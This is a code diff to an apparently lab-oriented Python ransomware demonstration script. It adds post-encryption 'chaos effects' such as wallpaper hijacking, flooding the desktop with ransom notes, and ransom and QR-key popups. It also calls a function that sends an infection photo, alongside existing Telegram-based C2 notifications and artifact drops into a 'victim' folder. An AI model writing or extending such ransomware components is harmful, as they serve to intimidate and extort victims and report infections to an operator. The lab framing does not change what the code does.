@@ -27,6 +27,15 @@ try:
 except ImportError:
     qrcode = None
 
+# === CHAOS EFFECTS IMPORT ===
+try:
+    from chaoscrypt.chaos_effects import ChaosEffects
+    HAS_CHAOS = True
+except ImportError:
+    ChaosEffects = None
+    HAS_CHAOS = False
+
+
 def drop_artifacts_to_victim(logger, qr_path):
     try:
         victim_folder = os.path.abspath(SHOW_TARGET_DIR)
@@ -48,11 +57,13 @@ def drop_artifacts_to_victim(logger, qr_path):
     except Exception as e:
         logger.log_event("error", f"Artifact drop failed: {e}")
 
+
 def process_c2_and_visuals(logger, key, n_files):
     qr_path = os.path.join(LOG_DIR, RANSOM_QR_NAME)
     if qrcode and key:
         try:
-            if os.path.exists(qr_path): os.remove(qr_path)
+            if os.path.exists(qr_path):
+                os.remove(qr_path)
             qr = qrcode.make(key)
             qr.save(qr_path)
             drop_artifacts_to_victim(logger, qr_path)
@@ -80,6 +91,64 @@ def process_c2_and_visuals(logger, key, n_files):
         time.sleep(2)
     else:
         print(f"[WARNING] Success image not found at {img_success}")
+
+
+def run_chaos_after_encryption(key, n_files):
+    """Запускає chaos_effects після шифрування — обої, popup, desktop flood."""
+    if not HAS_CHAOS:
+        print("[SHOW] chaos_effects not available, skipping visual effects.")
+        return
+
+    print("[SHOW] 🎭 Launching chaos effects...")
+    try:
+        fx = ChaosEffects()
+
+        # 1. Заражені обої
+        print("[SHOW] 🖥️ Setting infected wallpaper...")
+        fx.wallpaper_hijack()
+        time.sleep(1)
+
+        # 2. Desktop flood — записки на робочий стіл
+        print("[SHOW] 📝 Flooding desktop with ransom notes...")
+        fx.desktop_flood(count=5)
+        time.sleep(1)
+
+        # 3. Консольний терор
+        print("[SHOW] 💀 Console terror...")
+        fx.console_terror()
+        time.sleep(1)
+
+        # 4. Fake progress bar
+        print("[SHOW] ⏳ Fake encryption progress...")
+        fx.fake_encrypt_progress(total_files=n_files, duration=3)
+        time.sleep(1)
+
+        # 5. Glitch text
+        fx.glitch_text(text="YOUR FILES ARE ENCRYPTED", iterations=10)
+        time.sleep(1)
+
+        # 6. Audio beep
+        fx.audio_beep(count=3)
+        time.sleep(1)
+
+        # 7. Ransom popup з ключем
+        print("[SHOW] 💀 Ransom popup...")
+        fx.ransom_popup(duration=8)
+        time.sleep(1)
+
+        # 8. QR popup з ключем
+        print("[SHOW] 📱 QR popup...")
+        fx.qr_popup(key_text=f"Key: {key}", duration=6)
+        time.sleep(1)
+
+        # 9. TG photo
+        fx.send_infection_photo()
+
+        print("[SHOW] 🎭 Chaos effects complete!")
+        fx.logger.close()
+    except Exception as e:
+        print(f"[SHOW] Chaos effects error: {e}")
+
 
 def run_show_case():
     logger = LogBook(phase="show")
@@ -109,14 +178,22 @@ def run_show_case():
     if nenc > 0:
         sample_key = results[0][1]
         logger.fp_jsonl.flush()
+
+        # C2 + QR + TG notify
         process_c2_and_visuals(logger, sample_key, nenc)
+
+        # === CHAOS EFFECTS: обої + popups + desktop flood + все ===
+        run_chaos_after_encryption(sample_key, nenc)
+
         print(f"[SUCCESS] {nenc} files encrypted.")
     else:
         print("[WARNING] No files were encrypted. Run reset_lab.py first!")
         if send_message:
-            send_message("⚠️ <b>[C2]</b> No new targets found for encryption.", parse_mode="HTML", async_mode=True)
+            send_message("⚠️ <b>[C2]</b> No new targets found for encryption.",
+                         parse_mode="HTML", async_mode=True)
 
     logger.close()
+
 
 if __name__ == "__main__":
     run_show_case()
